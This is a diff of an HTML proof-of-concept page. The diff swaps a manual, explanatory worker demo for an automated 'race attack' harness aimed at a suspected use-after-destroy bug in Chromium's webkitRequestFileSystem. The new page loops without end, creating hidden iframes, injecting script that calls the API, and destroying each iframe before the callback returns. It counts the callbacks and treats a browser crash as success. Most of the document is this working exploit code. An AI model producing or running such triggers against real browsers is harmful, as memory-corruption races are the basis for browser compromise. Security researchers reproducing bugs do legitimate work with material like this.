@@ -1,175 +1,391 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Demonstrasi Bug webkitRequestFileSystem</title>
+    <title>DOMWindow FileSystem UAF PoC</title>
     <style>
-        body { font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; line-height: 1.6; padding: 20px; background-color: #f0f2f5; }
-        #container { max-width: 800px; margin: auto; background: #ffffff; padding: 25px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
-        h1, h2 { color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px; }
-        button { padding: 10px 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 5px; margin-right: 10px; background-color: #007bff; color: white; transition: background-color 0.3s; }
-        button:hover { background-color: #0056b3; }
-        button:disabled { background-color: #ccc; cursor: not-allowed; }
-        #log-container { margin-top: 20px; }
-        #log { border: 1px solid #ccc; background: #2b2b2b; color: #f0f0f0; padding: 10px; height: 300px; overflow-y: scroll; font-family: 'Courier New', Courier, monospace; font-size: 14px; border-radius: 5px; }
-        .flowchart { background: #e9ecef; padding: 15px; border-radius: 5px; margin-top: 20px; font-family: 'Courier New', Courier, monospace; border-left: 4px solid #17a2b8; }
+        body { 
+            font-family: 'Consolas', monospace; 
+            background: #0a0a0a; 
+            color: #c9d1d9; 
+            padding: 20px; 
+        }
+        h1 { color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
+        #controls { 
+            background: #161b22; 
+            padding: 15px; 
+            border-radius: 6px; 
+            margin: 15px 0;
+            border: 1px solid #30363d;
+        }
+        button { 
+            padding: 10px 20px; 
+            margin: 5px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            border: none; 
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        #btnStart { background: #238636; color: white; }
+        #btnStop { background: #da3633; color: white; }
+        #btnClear { background: #30363d; color: #c9d1d9; }
+        
+        #stats { 
+            display: flex; 
+            gap: 20px; 
+            margin: 10px 0; 
+            font-size: 13px;
+        }
+        .stat-box { 
+            background: #21262d; 
+            padding: 8px 12px; 
+            border-radius: 4px;
+            border: 1px solid #30363d;
+        }
+        .stat-label { color: #8b949e; }
+        .stat-value { color: #58a6ff; font-weight: bold; }
+        
+        #log { 
+            background: #010409; 
+            border: 1px solid #30363d; 
+            border-radius: 6px;
+            height: 400px; 
+            overflow-y: auto; 
+            padding: 10px; 
+            font-size: 11px;
+            white-space: pre-wrap;
+        }
+        .log-entry { margin: 2px 0; }
+        .log-js { color: #7ee787; }
+        .log-cpp { color: #ffa657; }
+        .log-race { color: #ff7b72; font-weight: bold; }
+        .log-error { color: #f85149; }
+        .log-success { color: #3fb950; }
+        .log-info { color: #8b949e; }
+        .log-crit { color: #d2a8ff; font-weight: bold; }
+        
+        #iframe-container {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+        
+        code { 
+            background: #6e768130; 
+            padding: 2px 6px; 
+            border-radius: 3px;
+        }
     </style>
 </head>
 <body>
 
-<div id="container">
-    <h1>Demonstrasi Bug Lifecycle <code>webkitRequestFileSystem</code></h1>
-    <p>Script ini mendemonstrasikan potensi <em>race condition</em> (Use-After-Destroy) yang dijelaskan dalam flowchart Anda. Intinya, sebuah Worker dapat dihentikan setelah ia membuat permintaan asinkron ke FileSystem, tetapi sebelum callback dari permintaan itu kembali.</p>
+    <h1>🔬 DOMWindow FileSystem Use-After-Destroy PoC</h1>
+    <p>Target: <code>DOMWindowFileSystem::webkitRequestFileSystem</code> (Async)</p>
+    <p>Trigger: <code>iframe navigation/remove</code> sebelum callback async return</p>
 
-    <h2>Flowchart Anda</h2>
-    <div class="flowchart">
-        <pre>
-Worker JS call -> Blink C++ -> Security Checks -> Async Dispatch
-       |                                                |
-       '--- (Worker bisa dihentikan di sini) ---'       |
-       |                                                V
-Callback kembali ke context worker yang mungkin sudah hancur -> CRASH
-        </pre>
+    <div id="controls">
+        <button id="btnStart" onclick="startAttack()">▶ Start Race Attack</button>
+        <button id="btnStop" onclick="stopAttack()">⏹ Stop</button>
+        <button id="btnClear" onclick="clearLog()">🗑 Clear Log</button>
+        
+        <div id="stats">
+            <div class="stat-box"><span class="stat-label">Iterations:</span> <span class="stat-value" id="statIter">0</span></div>
+            <div class="stat-box"><span class="stat-label">Callbacks Fired:</span> <span class="stat-value" id="statCb">0</span></div>
+            <div class="stat-box"><span class="stat-label">Crashes:</span> <span class="stat-value" id="statCrash">0</span></div>
+            <div class="stat-box"><span class="stat-label">Status:</span> <span class="stat-value" id="statStatus">IDLE</span></div>
+        </div>
     </div>
 
-    <h2>Coba Sendiri</h2>
-    <p>Ikuti langkah-langkah ini untuk mencoba memicu kondisi tersebut:</p>
-    <ol>
-        <li>Klik <b>"Mulai Worker"</b> untuk membuat worker baru.</li>
-        <li>Klik <b>"Minta FileSystem"</b>. Ini akan memberitahu worker untuk memanggil <code>webkitRequestFileSystem</code>.</li>
-        <li><b>SEGERA</b> setelah itu, klik <b>"Hentikan Worker"</b>.</li>
-    </ol>
-    <p>Jika Anda cukup cepat, Anda akan menghentikan worker di antara langkah 10 dan 12 dari flowchart. Di browser yang rentan, ini bisa menyebabkan tab atau browser crash karena callback mencoba berjalan pada context yang sudah tidak valid.</p>
+    <div id="log"></div>
+    
+    <!-- Container untuk iframe yang akan dibuat/dihancurkan -->
+    <div id="iframe-container"></div>
 
-    <div>
-        <button id="start-worker">1. Mulai Worker</button>
-        <button id="request-fs" disabled>2. Minta FileSystem</button>
-        <button id="terminate-worker" disabled>3. Hentikan Worker (Klik Cepat!)</button>
-    </div>
-
-    <div id="log-container">
-        <h2>Log Aktivitas</h2>
-        <div id="log"></div>
-    </div>
-</div>
-
-<script>
-// --- SCRIPT UNTUK HALAMAN UTAMA ---
-
-const startButton = document.getElementById('start-worker');
-const requestButton = document.getElementById('request-fs');
-const terminateButton = document.getElementById('terminate-worker');
-const logElement = document.getElementById('log');
-
-let worker = null;
-
-function log(message) {
-    console.log(message);
-    logElement.innerHTML += `[${new Date().toLocaleTimeString()}] ${message}<br>`;
-    logElement.scrollTop = logElement.scrollHeight;
-}
-
-// Konten untuk file worker.js dibuat sebagai string
-const workerScriptContent = `
-    // Polyfill untuk FileError jika tidak didefinisikan
-    if (typeof self.FileError === 'undefined') {
-        self.FileError = {
-            QUOTA_EXCEEDED_ERR: 10, NOT_FOUND_ERR: 1, SECURITY_ERR: 2,
-            INVALID_MODIFICATION_ERR: 9, INVALID_STATE_ERR: 7
-        };
-    }
-
-    self.onmessage = function(e) {
-        if (e.data === 'request-fs') {
-            postMessage('Menerima perintah, memanggil webkitRequestFileSystem...');
-            const size = 1024 * 1024; // 1MB
-
-            const onSuccess = function(fs) {
-                // Jika worker sudah mati, baris ini seharusnya tidak tereksekusi,
-                // tapi pemanggilan internal di C++ bisa menyebabkan UAF.
-                postMessage('SUKSES: FileSystem didapatkan! Nama: ' + fs.name);
-            };
-
-            const onError = function(err) {
-                let msg = 'ERROR: Gagal mendapatkan FileSystem. Kode error: ' + err.code;
-                postMessage(msg);
-            };
-
-            postMessage('Memanggil webkitRequestFileSystem(TEMPORARY, ' + size + ')');
-
-            // Langkah 10: Panggilan async dikirim. Worker sekarang rentan.
-            try {
-                self.webkitRequestFileSystem(self.TEMPORARY, size, onSuccess, onError);
-                postMessage('Panggilan async ke webkitRequestFileSystem telah dibuat.');
-            } catch (ex) {
-                postMessage('Error saat memanggil webkitRequestFileSystem: ' + ex.message);
+    <script>
+        // ========================================
+        // STATE GLOBAL
+        // ========================================
+        let isRunning = false;
+        let iteration = 0;
+        let callbacksFired = 0;
+        let crashCount = 0;
+        
+        // DOM references
+        const logDiv = document.getElementById('log');
+        const statIter = document.getElementById('statIter');
+        const statCb = document.getElementById('statCb');
+        const statCrash = document.getElementById('statCrash');
+        const statStatus = document.getElementById('statStatus');
+        const btnStart = document.getElementById('btnStart');
+        const iframeContainer = document.getElementById('iframe-container');
+        
+        // ========================================
+        // LOGGING UTILITIES
+        // ========================================
+        function log(msg, cls = 'log-info') {
+            const entry = document.createElement('div');
+            entry.className = 'log-entry ' + cls;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logDiv.appendChild(entry);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+        
+        function clearLog() {
+            logDiv.innerHTML = '';
+            iteration = 0;
+            callbacksFired = 0;
+            crashCount = 0;
+            updateStats();
+            log('Log cleared', 'log-info');
+        }
+        
+        function updateStats() {
+            statIter.textContent = iteration;
+            statCb.textContent = callbacksFired;
+            statCrash.textContent = crashCount;
+        }
+        
+        function setStatus(status, cls = '') {
+            statStatus.textContent = status;
+            statStatus.className = 'stat-value ' + cls;
+        }
+        
+        // ========================================
+        // CHECK API AVAILABILITY
+        // ========================================
+        function checkAPI() {
+            const hasAPI = typeof window.webkitRequestFileSystem !== 'undefined' ||
+                          typeof window.webkitPersistentStorage !== 'undefined';
+            
+            if (!hasAPI) {
+                log('⚠️ WebKit FileSystem API TIDAK tersedia di browser ini', 'log-error');
+                log('Coba Chrome versi < 100 atau flag: --enable-experimental-web-platform-features', 'log-info');
+                return false;
+            }
+            
+            log('✅ FileSystem API terdeteksi', 'log-success');
+            return true;
+        }
+        
+        // ========================================
+        // ATTACK CONTROL
+        // ========================================
+        function startAttack() {
+            if (isRunning) return;
+            
+            if (!checkAPI()) {
+                log('API tidak tersedia. Attack dibatalkan.', 'log-error');
+                return;
+            }
+            
+            isRunning = true;
+            iteration = 0;
+            callbacksFired = 0;
+            crashCount = 0;
+            updateStats();
+            setStatus('RACING...', 'log-success');
+            btnStart.disabled = true;
+            
+            log('═══════════════════════════════════════', 'log-info');
+            log('🚀 Starting DOMWindow Race Attack', 'log-success');
+            log('═══════════════════════════════════════', 'log-info');
+            log('[Flow-1] Target: window.webkitRequestFileSystem', 'log-js');
+            log('[Flow-2] Entry: DOMWindowFileSystem::webkitRequestFileSystem', 'log-cpp');
+            log('[Flow-4] Async: LocalFileSystem::RequestFileSystem(kAsynchronous)', 'log-cpp');
+            log('[Flow-5A] Race: iframe navigation/remove BEFORE callback', 'log-race');
+            log('[Flow-6-7] Bug: Callback on destroyed ExecutionContext', 'log-crit');
+            log('');
+            
+            // Request quota first (agar IPC benar-benar terjadi)
+            requestQuotaAndStart();
+        }
+        
+        function stopAttack() {
+            if (!isRunning) return;
+            isRunning = false;
+            setStatus('STOPPED', 'log-error');
+            btnStart.disabled = false;
+            log('');
+            log('🛑 Attack stopped by user', 'log-error');
+            log('Final: ' + iteration + ' iterations, ' + callbacksFired + ' callbacks', 'log-info');
+        }
+        
+        // ========================================
+        // QUOTA REQUEST (Pre-condition)
+        // ========================================
+        function requestQuotaAndStart() {
+            if (window.webkitPersistentStorage) {
+                log('[Pre] Requesting storage quota...', 'log-info');
+                window.webkitPersistentStorage.requestQuota(
+                    10 * 1024 * 1024, // 10MB
+                    function(granted) {
+                        log('[Pre] Quota granted: ' + granted + ' bytes', 'log-success');
+                        log('Starting race loop...', 'log-info');
+                        loopAttack();
+                    },
+                    function(err) {
+                        log('[Pre] Quota request failed, continuing anyway...', 'log-warn');
+                        loopAttack();
+                    }
+                );
+            } else {
+                log('[Pre] No quota API, starting direct attack...', 'log-warn');
+                loopAttack();
             }
         }
-    };
-`;
-
-// Membuat Worker dari Blob untuk menghindari kebutuhan file terpisah
-function createWorker() {
-    try {
-        const blob = new Blob([workerScriptContent], { type: 'application/javascript' });
-        return new Worker(URL.createObjectURL(blob));
-    } catch (e) {
-        log('Error membuat worker: ' + e.message);
-        return null;
-    }
-}
-
-startButton.addEventListener('click', () => {
-    log('Membuat worker...');
-    worker = createWorker();
-
-    if (worker) {
-        log('Worker berhasil dibuat.');
-
-        worker.onmessage = function(e) {
-            log('Pesan dari Worker: <span style="color:#87ceeb;">' + e.data + '</span>');
-        };
-
-        worker.onerror = function(e) {
-            log('Error di Worker: <span style="color:#ff6b6b;">' + e.message + '</span>');
-            e.preventDefault();
-        };
         
-        startButton.disabled = true;
-        requestButton.disabled = false;
-        terminateButton.disabled = false;
-    }
-});
-
-requestButton.addEventListener('click', () => {
-    log('MAIN: Mengirim pesan ke worker untuk meminta FileSystem.');
-    worker.postMessage('request-fs');
-    log('MAIN: Pesan terkirim. <b style="color:#f9ca24;">Sekarang klik "Hentikan Worker" secepatnya!</b>');
-});
-
-terminateButton.addEventListener('click', () => {
-    if (worker) {
-        log('MAIN: Menghentikan worker...');
-        worker.terminate();
-        log('MAIN: <b style="color:#ff8c00;">Worker dihentikan.</b> Jika callback FileSystem kembali setelah ini, bisa terjadi crash.');
-        worker = null;
+        // ========================================
+        // RACE CONDITION LOOP (Inti PoC)
+        // ========================================
+        async function loopAttack() {
+            while (isRunning) {
+                iteration++;
+                updateStats();
+                
+                // [Flow-1] Buat iframe baru = ExecutionContext baru
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframeContainer.appendChild(iframe);
+                
+                const iframeId = `IF-${iteration}`;
+                log(`[${iframeId}] [Flow-1] Created iframe (new ExecutionContext)`, 'log-js');
+                
+                const win = iframe.contentWindow;
+                const doc = iframe.contentDocument;
+                
+                // [Flow-1] Inject script yang memanggil webkitRequestFileSystem
+                // Ini akan trigger: DOMWindowFileSystem::webkitRequestFileSystem
+                const scriptCode = `
+                    (function() {
+                        var id = '${iframeId}';
+                        
+                        function log(msg) {
+                            window.parent.postMessage({
+                                type: 'iframe-log',
+                                id: id,
+                                message: msg
+                            }, '*');
+                        }
+                        
+                        try {
+                            // [Flow-1] Call API
+                            log('[IF-1] Calling webkitRequestFileSystem...');
+                            
+                            if (typeof webkitRequestFileSystem !== 'undefined') {
+                                webkitRequestFileSystem(
+                                    TEMPORARY,
+                                    1024 * 1024,  // 1MB request
+                                    function successCallback(filesystem) {
+                                        // [Flow-7] Callback dipanggil
+                                        // ⚠️ RACE: Jika iframe sudah navigate/remove,
+                                        // context sudah destroyed tapi callback tetap jalan
+                                        window.parent.postMessage({
+                                            type: 'callback-success',
+                                            id: id,
+                                            fsName: filesystem ? filesystem.name : 'null',
+                                            timestamp: Date.now()
+                                        }, '*');
+                                        log('[IF-7] ✅ SUCCESS callback fired!');
+                                    },
+                                    function errorCallback(error) {
+                                        window.parent.postMessage({
+                                            type: 'callback-error',
+                                            id: id,
+                                            code: error.code,
+                                            timestamp: Date.now()
+                                        }, '*');
+                                        log('[IF-7b] ❌ ERROR callback: ' + error.code);
+                                    }
+                                );
+                                log('[IF-4] Async request dispatched');
+                            } else {
+                                log('[IF-ERR] API not available in iframe');
+                            }
+                        } catch (e) {
+                            log('[IF-EXCEPTION] ' + e.message);
+                        }
+                    })();
+                `;
+                
+                // Inject dan eksekusi script di iframe
+                const scriptEl = doc.createElement('script');
+                scriptEl.textContent = scriptCode;
+                doc.body.appendChild(scriptEl);
+                
+                log(`[${iframeId}] [Flow-2-4] Script injected, API called (async dispatched)`, 'log-cpp');
+                
+                // ========================================
+                // [Flow-5A] RACE TRIGGER - Hancurkan Context!
+                // ========================================
+                // Strategi: Multiple destruction methods untuk memastikan context teardown
+                
+                // Method 1: Navigasi ke about:blank (paling agresif untuk teardown)
+                iframe.src = 'about:blank';
+                log(`[${iframeId}] [Flow-5A] 💥 iframe.src = 'about:blank' (navigation trigger)`, 'log-race');
+                
+                // Method 2: Remove dari DOM (trigger GC)
+                // Delay sangat kecil agar navigation sempat diproses dulu
+                setTimeout(() => {
+                    if (iframe.parentNode) {
+                        iframe.parentNode.removeChild(iframe);
+                        log(`[${iframeId}] [Flow-5A] 💥 iframe.remove() (DOM detach)`, 'log-race');
+                    }
+                }, 1);
+                
+                // Method 3: Nullify references
+                // win = null; doc = null; // (otomatis handled oleh GC)
+                
+                // ========================================
+                // Yield ke event loop (tanpa delay untuk race lebih ketat)
+                // ========================================
+                await new Promise(resolve => setTimeout(resolve, 0));
+                
+                // Logging periodik
+                if (iteration % 50 === 0) {
+                    log(`[Main] Iteration ${iteration}... race window active`, 'log-info');
+                }
+            }
+        }
         
-        requestButton.disabled = true;
-        terminateButton.disabled = true;
-        startButton.disabled = false;
-    }
-});
-
-// Cek apakah API didukung oleh browser saat halaman dimuat
-window.onload = function() {
-    if (!window.webkitRequestFileSystem && !window.requestFileSystem) {
-        log('<b style="color:#ff6b6b;">API webkitRequestFileSystem/requestFileSystem tidak didukung di browser ini. Demo tidak akan berfungsi.</b>');
-        startButton.disabled = true;
-    }
-};
-
-</script>
-
+        // ========================================
+        // MESSAGE HANDLER (Untuk callback dari iframe)
+        // ========================================
+        window.addEventListener('message', (e) => {
+            const data = e.data;
+            
+            if (data.type === 'iframe-log') {
+                log(`[${data.id}] ${data.message}`, 'log-js');
+            } 
+            else if (data.type === 'callback-success' || data.type === 'callback-error') {
+                callbacksFired++;
+                updateStats();
+                
+                // ⚠️ CRITICAL: Jika callback fired setelah iframe di-destroy,
+                // ini indikasi bug lifecycle!
+                log(`[${data.id}] ⚠️ CALLBACK FIRED POST-DESTROY! type=${data.type}`, 'log-crit');
+                
+                if (data.type === 'callback-success') {
+                    log(`[${data.id}] Filesystem: ${data.fsName}`, 'log-crit');
+                }
+            }
+        });
+        
+        // ========================================
+        // CLEANUP
+        // ========================================
+        window.addEventListener('beforeunload', () => {
+            iframeContainer.innerHTML = '';
+            log('[Main] Cleanup complete', 'log-info');
+        });
+        
+        // Auto-info on load
+        log('👉 Klik "Start Race Attack" untuk memulai', 'log-info');
+        log('📊 Pantau "Callbacks Fired" - jika ada callback setelah destroy = bug', 'log-info');
+        log('💥 Browser crash = bug berhasil (cek chrome://crashes)', 'log-info');
+    </script>
 </body>
 </html>
-
